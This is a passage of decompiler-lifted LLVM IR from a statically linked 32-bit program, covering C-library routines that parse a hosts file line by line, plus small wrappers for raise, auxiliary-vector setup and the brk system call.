  br i1 %v1_8056f31, label %dec_label_pc_80570ce.preheader, label %dec_label_pc_8056f37

dec_label_pc_8056f37:                             ; preds = %dec_label_pc_8056f19
  store i32 ptrtoint (i32* @global_var_805d470.584 to i32), i32* %stack_var_-216, align 4
  %v2_8056f43 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805d44f.586 to i32), i32 ptrtoint (i32* @global_var_805d470.584 to i32))
  %v1_8056f4b = icmp eq i32 %v2_8056f43, 0
  store i32 %v2_8056f43, i32* @ebp, align 4
  %v1_8056f4f = icmp eq i1 %v1_8056f4b, false
  br i1 %v1_8056f4f, label %dec_label_pc_80570ce.preheader, label %dec_label_pc_80570f8

dec_label_pc_80570ce.preheader:                   ; preds = %dec_label_pc_8056f19, %dec_label_pc_8056f37
  %v2_80570d5 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8057009 = add i32 %v3_8056eeb, 164
  %v4_8056ff8 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_80570ce

dec_label_pc_8056f5a:                             ; preds = %dec_label_pc_8056f65
  %v1_8056f5a = add i32 %v0_8056f5a56, 1
  store i32 %v1_8056f5a, i32* @ebx, align 4
  %v1_8056f5b = inttoptr i32 %v1_8056f5a to i8*
  %v2_8056f5b = load i8, i8* %v1_8056f5b, align 1
  %v3_8056f5b = zext i8 %v2_8056f5b to i32
  %v5_8056f5b = and i32 %v6_8056f5b59, -256
  %v6_8056f5b = or i32 %v3_8056f5b, %v5_8056f5b
  store i32 %v6_8056f5b, i32* @ecx, align 4
  %v4_8056f5d = icmp eq i8 %v2_8056f5b, 0
  br i1 %v4_8056f5d, label %dec_label_pc_80570ce, label %dec_label_pc_8056f65

dec_label_pc_8056f65:                             ; preds = %dec_label_pc_8056f65.lr.ph, %dec_label_pc_8056f5a
  %v6_8056f5b59 = phi i32 [ %v6_8056f5b53, %dec_label_pc_8056f65.lr.ph ], [ %v6_8056f5b, %dec_label_pc_8056f5a ]
  %v2_8056f5b58 = phi i8 [ %v2_8056f5b50, %dec_label_pc_8056f65.lr.ph ], [ %v2_8056f5b, %dec_label_pc_8056f5a ]
  %v1_8056f5b57 = phi i8* [ %v1_8056f5b49, %dec_label_pc_8056f65.lr.ph ], [ %v1_8056f5b, %dec_label_pc_8056f5a ]
  %v0_8056f5a56 = phi i32 [ %v0_8056f5b.pre, %dec_label_pc_8056f65.lr.ph ], [ %v1_8056f5a, %dec_label_pc_8056f5a ]
  store i32 %v0_8056f65.pre, i32* @eax, align 4
  %v2_8056f6a = sext i8 %v2_8056f5b58 to i32
  store i32 %v2_8056f6a, i32* @edx, align 4
  %v2_8056f6d = mul nsw i32 %v2_8056f6a, 2
  %v3_8056f6d = add i32 %v0_8056f65.pre, %v2_8056f6d
  %v4_8056f6d = inttoptr i32 %v3_8056f6d to i8*
  %v5_8056f6d = load i8, i8* %v4_8056f6d, align 1
  %v6_8056f6d = and i8 %v5_8056f6d, 32
  %v7_8056f6d = icmp eq i8 %v6_8056f6d, 0
  %v1_8056f71 = icmp eq i1 %v7_8056f6d, false
  br i1 %v1_8056f71, label %dec_label_pc_8056f5a, label %dec_label_pc_8056f73

dec_label_pc_8056f73:                             ; preds = %dec_label_pc_8056f65
  %v10_8056f73 = icmp eq i8 %v2_8056f5b58, 10
  br i1 %v10_8056f73, label %dec_label_pc_80570ce, label %dec_label_pc_8056f7c

dec_label_pc_8056f7c:                             ; preds = %dec_label_pc_8056f73
  %v10_8056f7c = icmp eq i8 %v2_8056f5b58, 35
  %v1_8056f87 = icmp eq i1 %v10_8056f7c, false
  br i1 %v1_8056f87, label %dec_label_pc_8056fd8.preheader, label %dec_label_pc_80570ce

dec_label_pc_8056fd8.preheader:                   ; preds = %dec_label_pc_8056f7c
  %v2_8056fd86 = load i8, i8* %v1_8056f5b57, align 1
  %v3_8056fd87 = icmp eq i8 %v2_8056fd86, 0
  br i1 %v3_8056fd87, label %dec_label_pc_8056fe4, label %dec_label_pc_8056fdd

dec_label_pc_8056f8e:                             ; preds = %dec_label_pc_8056fdd
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8056f92 = load i32, i32* @esp, align 4
  %v3_8056f92 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8056f92 = add nuw nsw i32 %v3_8056f92, 152
  %v5_8056f92 = add i32 %v4_8056f92, %v1_8056f92
  %v6_8056f92 = inttoptr i32 %v5_8056f92 to i32*
  store i32 %v0_8056f92, i32* %v6_8056f92, align 4
  %v0_8056f9c.pre = load i32, i32* @ebx, align 4
  %v4_8056f9c.pre = load i32, i32* @ecx, align 4
  %v1_8056f9c60 = inttoptr i32 %v0_8056f9c.pre to i8*
  %v2_8056f9c61 = load i8, i8* %v1_8056f9c60, align 1
  %v3_8056f9c62 = zext i8 %v2_8056f9c61 to i32
  %v5_8056f9c63 = and i32 %v4_8056f9c.pre, -256
  %v6_8056f9c64 = or i32 %v3_8056f9c62, %v5_8056f9c63
  %v4_8056f9e65 = icmp eq i8 %v2_8056f9c61, 0
  br i1 %v4_8056f9e65, label %dec_label_pc_8056fbb.preheader, label %dec_label_pc_8056fa2.lr.ph

dec_label_pc_8056fa2.lr.ph:                       ; preds = %dec_label_pc_8056f8e
  %v0_8056fa2.pre = load i32, i32* @global_var_805e1e8, align 8
  br label %dec_label_pc_8056fa2

dec_label_pc_8056f9b:                             ; preds = %dec_label_pc_8056fb0
  %v1_8056f9b = add i32 %v0_8056f9b67, 1
  store i32 %v1_8056f9b, i32* @ebx, align 4
  %v1_8056f9c = inttoptr i32 %v1_8056f9b to i8*
  %v2_8056f9c = load i8, i8* %v1_8056f9c, align 1
  %v3_8056f9c = zext i8 %v2_8056f9c to i32
  %v5_8056f9c = and i32 %v6_8056f9c69, -256
  %v6_8056f9c = or i32 %v3_8056f9c, %v5_8056f9c
  %v4_8056f9e = icmp eq i8 %v2_8056f9c, 0
  br i1 %v4_8056f9e, label %dec_label_pc_8056fbb.preheader, label %dec_label_pc_8056fa2

dec_label_pc_8056fa2:                             ; preds = %dec_label_pc_8056fa2.lr.ph, %dec_label_pc_8056f9b
  %v6_8056f9c69 = phi i32 [ %v6_8056f9c64, %dec_label_pc_8056fa2.lr.ph ], [ %v6_8056f9c, %dec_label_pc_8056f9b ]
  %v2_8056f9c68 = phi i8 [ %v2_8056f9c61, %dec_label_pc_8056fa2.lr.ph ], [ %v2_8056f9c, %dec_label_pc_8056f9b ]
  %v0_8056f9b67 = phi i32 [ %v0_8056f9c.pre, %dec_label_pc_8056fa2.lr.ph ], [ %v1_8056f9b, %dec_label_pc_8056f9b ]
  store i32 %v0_8056fa2.pre, i32* @eax, align 4
  %v2_8056fa7 = sext i8 %v2_8056f9c68 to i32
  store i32 %v2_8056fa7, i32* @edx, align 4
  %v2_8056faa = mul nsw i32 %v2_8056fa7, 2
  %v3_8056faa = add i32 %v0_8056fa2.pre, %v2_8056faa
  %v4_8056faa = inttoptr i32 %v3_8056faa to i8*
  %v5_8056faa = load i8, i8* %v4_8056faa, align 1
  %v6_8056faa = and i8 %v5_8056faa, 32
  %v7_8056faa = icmp eq i8 %v6_8056faa, 0
  %v1_8056fae = icmp eq i1 %v7_8056faa, false
  br i1 %v1_8056fae, label %dec_label_pc_8056fbb.preheader, label %dec_label_pc_8056fb0

dec_label_pc_8056fb0:                             ; preds = %dec_label_pc_8056fa2
  %v10_8056fb0 = icmp eq i8 %v2_8056f9c68, 10
  %v1_8056fb3 = icmp eq i1 %v10_8056fb0, false
  br i1 %v1_8056fb3, label %dec_label_pc_8056f9b, label %dec_label_pc_8056fbb.preheader

dec_label_pc_8056fbb.preheader:                   ; preds = %dec_label_pc_8056fb0, %dec_label_pc_8056fa2, %dec_label_pc_8056f9b, %dec_label_pc_8056f8e
  %v0_8056f9b.lcssa = phi i32 [ %v0_8056f9c.pre, %dec_label_pc_8056f8e ], [ %v1_8056f9b, %dec_label_pc_8056f9b ], [ %v0_8056f9b67, %dec_label_pc_8056fa2 ], [ %v0_8056f9b67, %dec_label_pc_8056fb0 ]
  %v6_8056f9c.lcssa = phi i32 [ %v6_8056f9c64, %dec_label_pc_8056f8e ], [ %v6_8056f9c, %dec_label_pc_8056f9b ], [ %v6_8056f9c69, %dec_label_pc_8056fa2 ], [ %v6_8056f9c69, %dec_label_pc_8056fb0 ]
  %v1_8056fbb75 = inttoptr i32 %v0_8056f9b.lcssa to i8*
  %v2_8056fbb76 = load i8, i8* %v1_8056fbb75, align 1
  %v3_8056fbb77 = zext i8 %v2_8056fbb76 to i32
  %v5_8056fbb78 = and i32 %v6_8056f9c.lcssa, -256
  %v6_8056fbb79 = or i32 %v3_8056fbb77, %v5_8056fbb78
  store i32 %v6_8056fbb79, i32* @ecx, align 4
  %v4_8056fbd80 = icmp eq i8 %v2_8056fbb76, 0
  br i1 %v4_8056fbd80, label %dec_label_pc_8056fd4, label %dec_label_pc_8056fc1

dec_label_pc_8056fb7:                             ; preds = %dec_label_pc_8056fcf, %dec_label_pc_8056fc1
  store i8 0, i8* %v1_8056fbb83, align 1
  %v0_8056fba = load i32, i32* @ebx, align 4
  %v1_8056fba = add i32 %v0_8056fba, 1
  store i32 %v1_8056fba, i32* @ebx, align 4
  %v4_8056fbb.pre = load i32, i32* @ecx, align 4
  %v1_8056fbb = inttoptr i32 %v1_8056fba to i8*
  %v2_8056fbb = load i8, i8* %v1_8056fbb, align 1
  %v3_8056fbb = zext i8 %v2_8056fbb to i32
  %v5_8056fbb = and i32 %v4_8056fbb.pre, -256
  %v6_8056fbb = or i32 %v3_8056fbb, %v5_8056fbb
  store i32 %v6_8056fbb, i32* @ecx, align 4
  %v4_8056fbd = icmp eq i8 %v2_8056fbb, 0
  br i1 %v4_8056fbd, label %dec_label_pc_8056fd4, label %dec_label_pc_8056fc1

dec_label_pc_8056fc1:                             ; preds = %dec_label_pc_8056fbb.preheader, %dec_label_pc_8056fb7
  %v2_8056fbb84 = phi i8 [ %v2_8056fbb, %dec_label_pc_8056fb7 ], [ %v2_8056fbb76, %dec_label_pc_8056fbb.preheader ]
  %v1_8056fbb83 = phi i8* [ %v1_8056fbb, %dec_label_pc_8056fb7 ], [ %v1_8056fbb75, %dec_label_pc_8056fbb.preheader ]
  %v0_8056fd882 = phi i32 [ %v1_8056fba, %dec_label_pc_8056fb7 ], [ %v0_8056f9b.lcssa, %dec_label_pc_8056fbb.preheader ]
  %v0_8056fc1 = load i32, i32* @global_var_805e1e8, align 8
  store i32 %v0_8056fc1, i32* @eax, align 4
  %v2_8056fc6 = sext i8 %v2_8056fbb84 to i32
  store i32 %v2_8056fc6, i32* @edx, align 4
  %v2_8056fc9 = mul nsw i32 %v2_8056fc6, 2
  %v3_8056fc9 = add i32 %v0_8056fc1, %v2_8056fc9
  %v4_8056fc9 = inttoptr i32 %v3_8056fc9 to i8*
  %v5_8056fc9 = load i8, i8* %v4_8056fc9, align 1
  %v6_8056fc9 = and i8 %v5_8056fc9, 32
  %v7_8056fc9 = icmp eq i8 %v6_8056fc9, 0
  %v1_8056fcd = icmp eq i1 %v7_8056fc9, false
  br i1 %v1_8056fcd, label %dec_label_pc_8056fb7, label %dec_label_pc_8056fcf

dec_label_pc_8056fcf:                             ; preds = %dec_label_pc_8056fc1
  %v10_8056fcf = icmp eq i8 %v2_8056fbb84, 10
  br i1 %v10_8056fcf, label %dec_label_pc_8056fb7, label %dec_label_pc_8056fd4

dec_label_pc_8056fd4:                             ; preds = %dec_label_pc_8056fb7, %dec_label_pc_8056fcf, %dec_label_pc_8056fbb.preheader
  %v0_8056fd8.lcssa = phi i32 [ %v0_8056f9b.lcssa, %dec_label_pc_8056fbb.preheader ], [ %v0_8056fd882, %dec_label_pc_8056fcf ], [ %v1_8056fba, %dec_label_pc_8056fb7 ]
  %v1_8056fbb.lcssa = phi i8* [ %v1_8056fbb75, %dec_label_pc_8056fbb.preheader ], [ %v1_8056fbb83, %dec_label_pc_8056fcf ], [ %v1_8056fbb, %dec_label_pc_8056fb7 ]
  %v4_8056fd4 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8056fd8 = load i8, i8* %v1_8056fbb.lcssa, align 1
  %v3_8056fd8 = icmp eq i8 %v2_8056fd8, 0
  br i1 %v3_8056fd8, label %dec_label_pc_8056fe4, label %dec_label_pc_8056fdd

dec_label_pc_8056fdd:                             ; preds = %dec_label_pc_8056fd8.preheader, %dec_label_pc_8056fd4
  %v0_8056f92 = phi i32 [ %v0_8056fd8.lcssa, %dec_label_pc_8056fd4 ], [ %v0_8056f5a56, %dec_label_pc_8056fd8.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8056fd4, %dec_label_pc_8056fd4 ], [ 0, %dec_label_pc_8056fd8.preheader ]
  %v7_8056fe2 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8056fe2, label %dec_label_pc_8056fe4, label %dec_label_pc_8056f8e

dec_label_pc_8056fe4:                             ; preds = %dec_label_pc_8056fd4, %dec_label_pc_8056fdd, %dec_label_pc_8056fd8.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8056fd8.preheader ], [ %v4_8056fd4, %dec_label_pc_8056fd4 ], [ %stack_var_-196.013, %dec_label_pc_8056fdd ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8056feb = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805d467.587 to i32), i32* %stack_var_-216, align 4
  %v5_8056ff8 = call i32 @__GI_strcoll(i8* %v4_8056ff8, i32 ptrtoint ([11 x i8]* @global_var_805d467.587 to i32), i32 %v0_8056feb, i32 %v0_8056feb)
  store i32 %v5_8056ff8, i32* @eax, align 4
  %v1_8057000 = icmp eq i32 %v5_8056ff8, 0
  br i1 %v1_8057000, label %dec_label_pc_8057028.preheader, label %dec_label_pc_8057039

dec_label_pc_8057028.preheader:                   ; preds = %dec_label_pc_8056fe4
  %v0_805702889 = load i32, i32* @esi, align 4
  %v5_805702c98 = icmp slt i32 %v0_805702889, %stack_var_-196.0.lcssa
  br i1 %v5_805702c98, label %dec_label_pc_805702e.lr.ph, label %dec_label_pc_8057039

dec_label_pc_805702e.lr.ph:                       ; preds = %dec_label_pc_8057028.preheader
  %v0_805702e.pre = load i32, i32* @global_var_8064b34.518, align 4
  br label %dec_label_pc_805702e

dec_label_pc_8057006:                             ; preds = %dec_label_pc_805702e
  %v2_8057009 = mul i32 %v0_805702899, 4
  %v4_8057009 = add i32 %v2_8057009, %v3_8057009
  %v5_8057009 = inttoptr i32 %v4_8057009 to i32*
  %v6_8057009 = load i32, i32* %v5_8057009, align 4
  %v1_8057010 = add i32 %v0_805702899, 1
  store i32 %v1_8057010, i32* @esi, align 4
  %v1_8057011 = inttoptr i32 %v6_8057009 to i8*
  %v2_8057011 = call i32 @__GI_strdup(i8* %v1_8057011)
  %v1_8057019 = load i32, i32* @ebx, align 4
  %v2_8057019 = mul i32 %v1_8057019, 4
  %v3_8057019 = add i32 %v2_8057019, 134630184
  %v4_8057019 = inttoptr i32 %v3_8057019 to i32*
  store i32 %v2_8057011, i32* %v4_8057019, align 4
  %v0_8057020 = load i32, i32* @ebx, align 4
  %v1_8057020 = add i32 %v0_8057020, 1
  store i32 %v1_8057020, i32* @eax, align 4
  store i32 %v1_8057020, i32* @global_var_8064b34.518, align 4
  %v0_8057028 = load i32, i32* @esi, align 4
  %v5_805702c = icmp slt i32 %v0_8057028, %stack_var_-196.0.lcssa
  br i1 %v5_805702c, label %dec_label_pc_805702e, label %dec_label_pc_8057039

dec_label_pc_805702e:                             ; preds = %dec_label_pc_805702e.lr.ph, %dec_label_pc_8057006
  %v0_805702e = phi i32 [ %v0_805702e.pre, %dec_label_pc_805702e.lr.ph ], [ %v1_8057020, %dec_label_pc_8057006 ]
  %v0_805702899 = phi i32 [ %v0_805702889, %dec_label_pc_805702e.lr.ph ], [ %v0_8057028, %dec_label_pc_8057006 ]
  store i32 %v0_805702e, i32* @ebx, align 4
  %v7_8057037 = icmp sgt i32 %v0_805702e, 2
  br i1 %v7_8057037, label %dec_label_pc_8057039, label %dec_label_pc_8057006

dec_label_pc_8057039:                             ; preds = %dec_label_pc_8057028.preheader, %dec_label_pc_8057006, %dec_label_pc_805702e, %dec_label_pc_8056fe4
  %v0_8057039 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805d472.588 to i32), i32* %stack_var_-216, align 4
  %v0_8057040 = load i32, i32* @edi, align 4
  %v4_8057041 = inttoptr i32 %v0_8057040 to i8*
  %v5_8057041 = call i32 @__GI_strcoll(i8* %v4_8057041, i32 ptrtoint ([7 x i8]* @global_var_805d472.588 to i32), i32 %v0_8057039, i32 %v0_8057039)
  store i32 %v5_8057041, i32* @eax, align 4
  %v1_8057049 = icmp eq i32 %v5_8057041, 0
  br i1 %v1_8057049, label %dec_label_pc_805708b.preheader, label %dec_label_pc_805704d

dec_label_pc_805704d:                             ; preds = %dec_label_pc_8057039
  %v0_805704d = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805d479.589 to i32), i32* %stack_var_-216, align 4
  %v0_8057054 = load i32, i32* @edi, align 4
  %v4_8057055 = inttoptr i32 %v0_8057054 to i8*
  %v5_8057055 = call i32 @__GI_strcoll(i8* %v4_8057055, i32 ptrtoint ([7 x i8]* @global_var_805d479.589 to i32), i32 %v0_805704d, i32 %v0_805704d)
  %v1_805705d = icmp eq i32 %v5_8057055, 0
  br i1 %v1_805705d, label %dec_label_pc_805708b.preheader, label %dec_label_pc_80570ce

dec_label_pc_805708b.preheader:                   ; preds = %dec_label_pc_8057039, %dec_label_pc_805704d
  %v0_805708b100 = load i32, i32* @global_var_8064b38.582, align 8
  %tmp43103 = icmp slt i32 %v0_805708b100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8057063, label %dec_label_pc_8057094

dec_label_pc_8057063:                             ; preds = %dec_label_pc_805708b.preheader, %dec_label_pc_8057063.dec_label_pc_8057063_crit_edge
  %v0_805708b105 = phi i32 [ %v0_805708b, %dec_label_pc_8057063.dec_label_pc_8057063_crit_edge ], [ %v0_805708b100, %dec_label_pc_805708b.preheader ]
  %v1_8057063 = add i32 %v0_805708b105, -1
  %v1_8057067 = mul i32 %v1_8057063, 4
  %v2_8057067 = add i32 %v1_8057067, 134630168
  %v3_8057067 = inttoptr i32 %v2_8057067 to i32*
  %v4_8057067 = load i32, i32* %v3_8057067, align 4
  store i32 %v1_8057063, i32* @global_var_8064b38.582, align 8
  %v1_8057073 = call i32 @free(i32 %v4_8057067)
  %v0_8057078 = load i32, i32* @global_var_8064b38.582, align 8
  %v1_8057080 = mul i32 %v0_8057078, 4
  %v2_8057080 = add i32 %v1_8057080, ptrtoint (i32* @global_var_8064b18.590 to i32)
  %v3_8057080 = inttoptr i32 %v2_8057080 to i32*
  store i32 0, i32* %v3_8057080, align 4
  %v0_805708b = load i32, i32* @global_var_8064b38.582, align 8
  %tmp43 = icmp slt i32 %v0_805708b, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8057063.dec_label_pc_8057063_crit_edge, label %dec_label_pc_8057094

dec_label_pc_8057063.dec_label_pc_8057063_crit_edge: ; preds = %dec_label_pc_8057063
  br label %dec_label_pc_8057063

dec_label_pc_8057094:                             ; preds = %dec_label_pc_8057063, %dec_label_pc_805708b.preheader
  %v0_805708b.lcssa = phi i32 [ %v0_805708b100, %dec_label_pc_805708b.preheader ], [ %v0_805708b, %dec_label_pc_8057063 ]
  store i32 1, i32* @esi, align 4
  %v5_80570c1115 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80570c1115, label %dec_label_pc_80570c3, label %dec_label_pc_80570ce

dec_label_pc_805709b:                             ; preds = %dec_label_pc_80570c3
  %v2_805709e = mul i32 %v0_80570a5117, 4
  %v4_805709e = add i32 %v2_805709e, %v3_8057009
  %v5_805709e = inttoptr i32 %v4_805709e to i32*
  %v6_805709e = load i32, i32* %v5_805709e, align 4
  %v1_80570a5 = add i32 %v0_80570a5117, 1
  store i32 %v1_80570a5, i32* @esi, align 4
  %v1_80570a6 = inttoptr i32 %v6_805709e to i8*
  %v2_80570a6 = call i32 @__GI_strdup(i8* %v1_80570a6)
  %v1_80570ae = load i32, i32* @ebx, align 4
  %v2_80570ae = mul i32 %v1_80570ae, 4
  %v3_80570ae = add i32 %v2_80570ae, 134630168
  %v4_80570ae = inttoptr i32 %v3_80570ae to i32*
  store i32 %v2_80570a6, i32* %v4_80570ae, align 4
  %v0_80570b5 = load i32, i32* @ebx, align 4
  %v1_80570b5 = add i32 %v0_80570b5, 1
  store i32 %v1_80570b5, i32* @global_var_8064b38.582, align 8
  %v0_80570bd.pre = load i32, i32* @esi, align 4
  %v5_80570c1 = icmp slt i32 %v0_80570bd.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80570c1, label %dec_label_pc_80570c3, label %dec_label_pc_80570ce

dec_label_pc_80570c3:                             ; preds = %dec_label_pc_8057094, %dec_label_pc_805709b
  %v0_80570a5117 = phi i32 [ %v0_80570bd.pre, %dec_label_pc_805709b ], [ 1, %dec_label_pc_8057094 ]
  %v0_80570c3116 = phi i32 [ %v1_80570b5, %dec_label_pc_805709b ], [ %v0_805708b.lcssa, %dec_label_pc_8057094 ]
  store i32 %v0_80570c3116, i32* @ebx, align 4
  %v7_80570cc = icmp sgt i32 %v0_80570c3116, 3
  br i1 %v7_80570cc, label %dec_label_pc_80570ce, label %dec_label_pc_805709b

dec_label_pc_80570ce:                             ; preds = %dec_label_pc_8056f5b.preheader, %dec_label_pc_8056f5a, %dec_label_pc_8057094, %dec_label_pc_80570c3, %dec_label_pc_805709b, %dec_label_pc_805704d, %dec_label_pc_8056f7c, %dec_label_pc_8056f73, %dec_label_pc_80570ce.preheader
  %v0_80570ce = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80570d5, i32* @ebx, align 4
  %v3_80570da = call i32 @fgets(i32 %v2_80570d5, i32 128, i32 %v0_80570ce)
  store i32 %v3_80570da, i32* @eax, align 4
  %v1_80570e2 = icmp eq i32 %v3_80570da, 0
  %v1_80570e4 = icmp eq i1 %v1_80570e2, false
  br i1 %v1_80570e4, label %dec_label_pc_8056f5b.preheader, label %dec_label_pc_80570ea

dec_label_pc_8056f5b.preheader:                   ; preds = %dec_label_pc_80570ce
  %v0_8056f5b.pre = load i32, i32* @ebx, align 4
  %v4_8056f5b.pre = load i32, i32* @ecx, align 4
  %v1_8056f5b49 = inttoptr i32 %v0_8056f5b.pre to i8*
  %v2_8056f5b50 = load i8, i8* %v1_8056f5b49, align 1
  %v3_8056f5b51 = zext i8 %v2_8056f5b50 to i32
  %v5_8056f5b52 = and i32 %v4_8056f5b.pre, -256
  %v6_8056f5b53 = or i32 %v3_8056f5b51, %v5_8056f5b52
  store i32 %v6_8056f5b53, i32* @ecx, align 4
  %v4_8056f5d54 = icmp eq i8 %v2_8056f5b50, 0
  br i1 %v4_8056f5d54, label %dec_label_pc_80570ce, label %dec_label_pc_8056f65.lr.ph

dec_label_pc_8056f65.lr.ph:                       ; preds = %dec_label_pc_8056f5b.preheader
  %v0_8056f65.pre = load i32, i32* @global_var_805e1e8, align 8
  br label %dec_label_pc_8056f65

dec_label_pc_80570ea:                             ; preds = %dec_label_pc_80570ce
  %v0_80570ed = load i32, i32* @ebp, align 4
  %v1_80570ee = inttoptr i32 %v0_80570ed to i16*
  %v2_80570ee = call i32 @__GI_fclose(i16* %v1_80570ee)
  br label %dec_label_pc_8057103

dec_label_pc_80570f8:                             ; preds = %dec_label_pc_8056f37
  %v0_80570f8 = call i32 @__GI___h_errno_location()
  %v1_80570fd = inttoptr i32 %v0_80570f8 to i32*
  store i32 3, i32* %v1_80570fd, align 4
  br label %dec_label_pc_8057103

dec_label_pc_8057103:                             ; preds = %entry, %dec_label_pc_80570ea, %dec_label_pc_80570f8
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8056ef0, i32* @eax, align 4
  %v2_805710f = call i32 @__pthread_return_void(i32 %v2_8056ef0, i32 1)
  store i32 %v0_8056edc, i32* @ebp, align 4
  ret i32 %v2_805710f

; uselistorder directives
  uselistorder i32 %v0_8056f65.pre, { 1, 0 }
  uselistorder i32 %v6_8056f5b53, { 1, 0 }
  uselistorder i8 %v2_8056f5b50, { 1, 2, 0 }
  uselistorder i8* %v1_8056f5b49, { 1, 0 }
  uselistorder i32 %v0_8056f5b.pre, { 1, 0 }
  uselistorder i32 %v0_805708b, { 0, 2, 1 }
  uselistorder i32 %v0_805702e, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8056fc6, { 1, 0 }
  uselistorder i32 %v2_8056fa7, { 1, 0 }
  uselistorder i32 %v1_8056f9b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8056f6a, { 1, 0 }
  uselistorder i32 %v1_8056f5a, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_8064b38.582, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8064b34.518, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805e448.517 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8057103, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80570ce, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_80570c3, { 1, 0 }
  uselistorder label %dec_label_pc_8057063, { 1, 0 }
  uselistorder label %dec_label_pc_805708b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057039, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805702e, { 1, 0 }
  uselistorder label %dec_label_pc_8056fe4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056fdd, { 1, 0 }
  uselistorder label %dec_label_pc_8056fd4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056fc1, { 1, 0 }
  uselistorder label %dec_label_pc_8056fa2, { 1, 0 }
  uselistorder label %dec_label_pc_80570ce.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_8057143 = inttoptr i32 %arg3 to i32*
  %v10_8057143 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8057143, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8057143
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805714f = call i32 @__libc_getpid()
  %v2_805715b = call i32 @kill(i32 %v0_805714f, i32 %arg1)
  ret i32 %v2_805715b

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1, 3 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_8057164 = load i32, i32* @eax, align 4
  %v1_8057164 = add i32 %v0_8057164, 28
  %v2_8057164 = inttoptr i32 %v1_8057164 to i32*
  %v3_8057164 = load i32, i32* %v2_8057164, align 4
  store i32 %v3_8057164, i32* @global_var_8064b3c.591, align 4
  %v1_805716d = add i32 %v0_8057164, 44
  %v2_805716d = inttoptr i32 %v1_805716d to i32*
  %v3_805716d = load i32, i32* %v2_805716d, align 4
  store i32 %v3_805716d, i32* @global_var_8064b40.592, align 64
  ret i32 %v3_805716d
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057178 = load i32, i32* @ebx, align 4
  store i32 %v0_8057178, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805718b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805718b, i32* @global_var_8064704.569, align 4
  %v7_8057196 = icmp ult i32 %v1_805718b, %arg1
  %v1_8057198 = icmp eq i1 %v7_8057196, false
  br i1 %v1_8057198, label %dec_label_pc_80571a8, label %dec_label_pc_805719a

dec_label_pc_805719a:                             ; preds = %entry
  %v0_805719a = load i32, i32* %stack_var_-4, align 4
  %v1_805719a = call i32 @__errno_location(i32 %v0_805719a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80571a2 = inttoptr i32 %v1_805719a to i32*
  store i32 12, i32* %v1_80571a2, align 4
  %v0_80571a9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80571a8

dec_label_pc_80571a8:                             ; preds = %entry, %dec_label_pc_805719a
  %v0_80571a9 = phi i32 [ 0, %entry ], [ %v0_80571a9.pre, %dec_label_pc_805719a ]
  %v2_80571ac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80571ac, i32* @ebx, align 4
  ret i32 %v0_80571a9

; uselistorder directives
  uselistorder i32 %v1_805718b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8064704.569, { 1, 0, 2 }
